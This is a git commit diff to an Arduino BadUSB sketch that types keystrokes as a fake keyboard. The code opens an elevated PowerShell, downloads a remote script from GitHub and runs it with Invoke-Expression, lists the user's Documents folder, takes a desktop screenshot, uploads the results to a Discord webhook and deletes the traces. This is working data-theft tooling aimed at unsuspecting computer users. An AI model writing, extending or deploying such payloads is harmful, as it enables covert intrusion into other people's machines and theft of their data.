ed668eb25efe5501aa50ae3c591b5ac8b501939a
Marquito0077 <90941250+Marquito0077@users.noreply.github.com>
2024-01-25 13:16:56 -0400

    Added a "Desktop Screenshot" Function

--- PowerShell_Exfiltration_BadUSB/PowerShell_Exfiltration_BadUSB.ino
+++ PowerShell_Exfiltration_BadUSB/PowerShell_Exfiltration_BadUSB.ino
@@ -12,10 +12,19 @@
 
   The Upload-Discord function was taken from the I am Jakoby
   GitHub repository.
+
+  PS = PowerShell
 */
 
-void setup() {
-  DigiKeyboard.update();
+void getUploadDiscordFunction() {
+  // downloads the Upload-Discord PS function from GitHub
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.println("$ScriptFromGitHub = Invoke-WebRequest https://raw.githubusercontent.com/Marquito0077/Team-Echo-Repo/main/Discord_Upload_PowerShell.ps1");
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.println("Invoke-Expression $($ScriptFromGitHub.content)");
+}
+
+void enterPowerShell() {
   // Accessing PowerShell
   DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT); // opens the execute popup
@@ -25,27 +34,56 @@ void setup() {
   DigiKeyboard.sendKeyStroke(KEY_LEFT); // selects "yes"
   DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_ENTER); // hits enter
+}
 
+void intoDocumentsFolder() {
   // Accessing the Documents Folder
   DigiKeyboard.delay(1000);
   DigiKeyboard.println("$pathDocs = [Environment]::GetFolderPath('MyDocuments')"); // gets the folder path
   DigiKeyboard.delay(1000);
   DigiKeyboard.println("cd $pathDocs"); // changes directory into that path
   DigiKeyboard.delay(1000);
-  DigiKeyboard.println("ls | Out-File -FilePath nothingToSee.txt"); // lists the contents of the folder
+  DigiKeyboard.println("ls | Out-File -FilePath docsFolderContents.txt"); // lists the contents of the folder
                                                                     // and outputs it on a text file in the same directory
 
   DigiKeyboard.delay(1000);
-  DigiKeyboard.println("$ScriptFromGitHub = Invoke-WebRequest https://raw.githubusercontent.com/Marquito0077/Team-Echo-Repo/main/Discord_Upload_PowerShell.ps1");
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.println("Invoke-Expression $($ScriptFromGitHub.content)");
-
-
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.println('Upload-Discord -file "nothingToSee.txt"'); // uploads the file to the Discord webhook
+  DigiKeyboard.println('Upload-Discord -file "docsFolderContents.txt" -text "CONTENTS OF USER DOCS FOLDER"'); // uploads the file to the Discord webhook
 
   DigiKeyboard.delay(1000);
   DigiKeyboard.println("rm nothingToSee.txt"); // removes the log file after uploading to Discord
+}
+
+void screenshotTheDesktop() {
+  // Screenshots the computers Desktop (wallpaper)
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT); // minimizes all windows
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(70, MOD_GUI_LEFT); // uses the Print Screen key to take the screenshot
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(43, MOD_ALT_LEFT); // gets back to PS
+
+  
+  // Finds the screenshot in the MyPictures folder
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.println("$pathPics = [Environment]::GetFolderPath('MyPictures')"); // gets the folder path
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.println("$latestFile = gci Screenshots | sort LastWriteTime | select -last 1"); // gets the latest file written
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.println("cd Screenshots");
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.println('Upload-Discord -file $latestFile.Name -text "DESKTOP WALLPAPER SCREENSHOT"');
+  
+}
+
+void setup() {
+  DigiKeyboard.update();
+
+   enterPowerShell();
+   getUploadDiscordFunction();
+
+  // intoDocumentsFolder();
+
+  screenshotTheDesktop();
   
   DigiKeyboard.delay(1000);
   DigiKeyboard.println("exit");  // closes the PowerShell window
